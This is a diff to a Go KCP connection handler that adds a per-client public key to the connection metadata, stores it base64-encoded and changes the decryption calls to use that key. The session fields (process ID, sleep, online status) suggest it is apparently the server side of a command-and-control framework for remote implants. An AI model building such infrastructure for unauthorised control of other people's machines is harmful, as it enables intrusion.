@@ -11,6 +11,7 @@ import (
 	"BackendTemplate/pkg/utils"
 	"BackendTemplate/pkg/webhooks"
 	"bufio"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"io"
@@ -345,7 +346,7 @@ func HandleKCPConnection(session *kcp.UDPSession) {
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("KCP Decrypt failed:", err, "from:", remoteAddr)
 				break
@@ -382,7 +383,8 @@ func HandleKCPConnection(session *kcp.UDPSession) {
 					logger.Error("KCP metainfo too short for parsing from:", remoteAddr)
 					break
 				}
-
+				publicKey := metainfo[:32]
+				metainfo = metainfo[32:]
 				processID := binary.BigEndian.Uint32(metainfo[:4])
 				flag := int(metainfo[4])
 
@@ -463,6 +465,7 @@ func HandleKCPConnection(session *kcp.UDPSession) {
 					Sleep:      "0",
 					Online:     "1",
 					Color:      "",
+					PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
 				}
 
 				// 使用事务插入数据库
@@ -550,7 +553,7 @@ func HandleKCPConnection(session *kcp.UDPSession) {
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("KCP Decrypt failed:", err)
 				break
@@ -570,13 +573,13 @@ func HandleKCPConnection(session *kcp.UDPSession) {
 				break
 			}
 
-			dataBytes, err = encrypt.Decrypt(dataBytes)
+			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
 			if err != nil {
 				logger.Error("KCP first decrypt failed:", err)
 				break
 			}
 
-			dataBytes, err = encrypt.Decrypt(dataBytes)
+			dataBytes, err = encrypt.Decrypt(dataBytes, uid)
 			if err != nil {
 				logger.Error("KCP second decrypt failed:", err)
 				break
@@ -823,7 +826,7 @@ WHERE uid = ? AND file_path = ?;
 				break
 			}
 
-			metainfo, err := encrypt.Decrypt(tmpMetainfo)
+			metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
 			if err != nil {
 				logger.Error("KCP Decrypt failed:", err)
 				break
